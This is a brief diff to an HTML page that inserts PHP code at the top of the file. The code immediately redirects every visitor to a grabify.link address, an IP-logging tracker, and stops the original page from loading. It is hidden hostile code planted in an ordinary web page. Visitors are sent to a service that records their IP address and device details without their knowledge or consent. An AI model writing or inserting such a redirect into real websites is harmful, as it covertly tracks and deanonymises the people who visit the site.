@@ -1,3 +1,7 @@
+<?php
+header("Location: https://grabify.link/UOUTH8", true, 302);
+exit;
+?>
 <!DOCTYPE html><html><head>
     
     <!-- partial header -->
